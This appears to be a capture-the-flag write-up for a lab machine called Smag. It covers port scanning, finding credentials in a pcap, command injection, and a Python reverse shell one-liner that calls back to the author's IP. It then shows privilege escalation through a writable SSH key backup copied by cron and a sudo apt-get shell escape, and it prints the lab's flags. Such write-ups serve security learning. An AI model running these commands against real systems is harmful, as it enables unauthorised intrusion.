### Nmap

```
─[✗]─[glack@parrot]─[~/Desktop/THM/easy_peasy]
└──╼ $nmap -sV -sT -A 10.10.185.249
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-28 16:39 IST
Nmap scan report for 10.10.185.249
Host is up (0.14s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 74e0e1b405856a15687e16daf2c76bee (RSA)
|   256 bd4362b9a1865136f8c7dff90f638fa3 (ECDSA)
|_  256 f9e7da078f10af970b3287c932d71b76 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Smag
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```


### HTTP

1. Ran a ffuf directory brute force
```
─[glack@parrot]─[~/Desktop/THM/easy_peasy]
└──╼ $ffuf -w /usr/share/wordlists/small.txt:FUZZ -u http://10.10.185.249/FUZZ -e php,html -t 50
```

```
http://10.10.185.249/mail/
```
2. Downloaded the .pcap file and found a set of creds and URL in it
```
username=helpdesk&password=cH4nG3M3_n0w

POST /login.php HTTP/1.1

Host: development.smag.thm

```

3. Added the following entry in `/etc/hosts` file
```
10.10.185.249 development.smag.thm
```

logged into the 

```
http://development.smag.thm/login.php

```

We were prompted the enter a command, but was not getting any response in return, so to confirm if my commands were getting execute i used [[How to check if ping on target system is running by pinging urself]]


### Foothold

And i got the the ping commands on tcp dump

1. used this to start a reverse tcp connect using this as command in burpsuite(baash nad php didnt work for me dont know why)
I also used the option - `Change body encoding` in burpsuite

Note: don't encode the python code
```
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.17.24.189",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```

```
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Priv Esc
1. one working cronjob
```
/bin/cat /opt/.backups/jake_id_rsa.pub.backup > /home/jake/.ssh/authorized_keys
```

```
-rw-rw-rw- 1 root root  563 Jun  5  2020 jake_id_rsa.pub.backup
```


2. Created and SSH key pair- 
```
─[✗]─[glack@parrot]─[~/Desktop/THM/smart_grotto]
└──╼ $ssh-keygen 
```

viewed and copied the public key

```
┌─[glack@parrot]─[~/Desktop/THM/smart_grotto]
└──╼ $cat id_rsa.pub
```

Since we are able to write the jake_id_rsa.pub.backup file, i appended my key to the file

```
www-data@smag:/opt/.backups$ echo "<key>....... glack@parrot" >> jake_id_rsa.pub.backup
```

3. Waited for one min, for the cronjob to run

4. then used the other private key to login as jake 
```
─[glack@parrot]─[~/Desktop/THM/smart_grotto]
└──╼ $ssh -i id_rsa jake@10.10.163.243
```

```
jake@smag:~$ cat user.txt
iusGorV7EbmxM5AuIe2w499msaSuqU3j

```

### Root

1. with nothing much to go on, i used the lineas.sh for automated enumeration
Usefull stuff I found

```
╔══════════╣ PATH
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-path-abuses
/home/jake/bin:/home/jake/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games

```

Missed this during manual enumm i didnt try it as i had not password and i though this command always promted the use for a password

```
User jake may run the following commands on smag:
    (ALL : ALL) NOPASSWD: /usr/bin/apt-get
```

got root shell with the help of GTFO bins using

```
jake@smag:~$ sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
# id
uid=0(root) gid=0(root) groups=0(root)
# 

```

```
# cat root.txt
uJr6zRgetaniyHVRqqL58uRasybBKz2T

```